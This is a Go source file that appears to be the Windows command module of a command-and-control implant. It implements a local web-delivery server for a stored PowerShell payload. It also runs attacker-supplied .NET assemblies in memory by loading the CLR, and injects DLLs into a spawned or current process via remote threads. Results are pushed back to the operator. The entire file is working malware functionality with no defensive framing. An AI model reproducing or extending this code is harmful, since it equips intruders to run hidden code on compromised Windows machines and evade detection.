//go:build windows

package command

import (
	"bytes"
	"errors"
	"fmt"
	"github.com/Ne0nd0g/go-clr"
	"golang.org/x/sys/windows"
	"main/config"
	"main/packet"
	"net"
	"strconv"
	"strings"
	"unsafe"
)

var powershellModule []byte

func PowershellImport(b []byte) {
	powershellModule = b
}

func WebDelivery(b []byte) {
	buf := bytes.NewBuffer(b)
	serverPort := packet.ReadShort(buf)
	go func() {
		l, err := net.Listen("tcp", "127.0.0.1:"+strconv.Itoa(int(serverPort)))
		if err != nil {
			packet.ErrorMessage(err.Error())
			return
		}
		defer l.Close()
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting: ", err)
			packet.ErrorMessage(err.Error())
			return
		}
		defer conn.Close()
		httpHeader := fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\n\r\n", len(powershellModule))
		receive := make([]byte, 256)
		_, _ = conn.Read(receive)
		_, _ = conn.Write([]byte(httpHeader))
		_, _ = conn.Write(powershellModule)
		_ = conn.Close()
	}()
}

func ExecAsm(b []byte, isDllX64 bool, ignoreToken bool) error {
	//return execAsmInject(b, isDllX64, ignoreToken)
	return execAsmGo(b)
}

func execAsmInject(b []byte, isDllX64 bool, ignoreToken bool) error {
	// callBackType, sleepTime, offset, description, csharp, dll, err
	callBackType, _, offset, _, csharp, dll, err := parseExecAsm(b)
	if config.InjectSelf {
		currentPid = windows.GetCurrentProcessId()
		err = injectSelf(dll, offset, csharp)
		if err != nil {
			currentPid = 0
		}
		return err
	} else {
		procInfo := &windows.ProcessInformation{}
		startupInfo := &windows.StartupInfo{
			Flags:      windows.STARTF_USESTDHANDLES,
			ShowWindow: 1,
		}
		var readPipe, writePipe windows.Handle
		sa := windows.SecurityAttributes{
			Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
			SecurityDescriptor: nil,
			InheritHandle:      1, //true
		}

		err = windows.CreatePipe(&readPipe, &writePipe, &sa, 0)
		if err != nil {
			return errors.New(fmt.Sprintf("CreatePipe error: %s", err))
		}
		defer windows.CloseHandle(writePipe)
		defer windows.CloseHandle(readPipe)
		startupInfo.Flags = windows.STARTF_USESTDHANDLES
		startupInfo.StdErr = writePipe
		startupInfo.StdOutput = writePipe

		err = spawnTempProcess(procInfo, startupInfo, isDllX64, ignoreToken)
		defer windows.CloseHandle(procInfo.Process)
		defer windows.CloseHandle(procInfo.Thread)
		if err != nil {
			return err
		}

		err = createRemoteThread(procInfo.Process, dll, offset, csharp)
		if err != nil {
			return err
		}
		// always set to 15000, this is to long
		//time.Sleep(time.Millisecond * time.Duration(sleepTime))
		buf := make([]byte, 1024)
		var read windows.Overlapped
		// document said bytesRead can't be none under win7
		var bytesRead uint32
		err = windows.ReadFile(readPipe, buf, &bytesRead, &read)
		if err != nil {
			packet.ErrorMessage("error reading result")
		}
		packet.PushResult(int(callBackType), buf[:bytesRead])
		windows.CloseHandle(writePipe)
		windows.CloseHandle(readPipe)
		return nil
	}
}

func execAsmGo(b []byte) error {
	// callBackType, sleepTime, offset, description, csharp, dll, err
	callBackType, _, _, _, csharp, _, err := parseExecAsm(b)
	// use golang to execute assembly directly
	csharpBuf := bytes.NewBuffer(csharp)
	csharpBin, _ := parseAnArg(csharpBuf)
	csharpArgs := csharpBuf.Bytes()
	args := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(&csharpArgs[0])))
	// use space as separator of command
	argsArr := strings.Split(args, " ")

	err = clr.RedirectStdoutStderr()
	if err != nil {
		return errors.New(fmt.Sprintf("RedirectStdoutStderr error: %s", err))
	}
	runtimeHost, err := clr.LoadCLR("v4.8")
	if err != nil {
		return errors.New(fmt.Sprintf("LoadCLR error: %s", err))
	}
	methodInfo, err := clr.LoadAssembly(runtimeHost, csharpBin)
	if err != nil {
		return errors.New(fmt.Sprintf("LoadAssembly error: %s", err))
	}
	stdout, stderr := clr.InvokeAssembly(methodInfo, argsArr)
	if stderr != "" {
		return errors.New(stderr)
	}
	packet.PushResult(int(callBackType), []byte(stdout))
	return nil
}
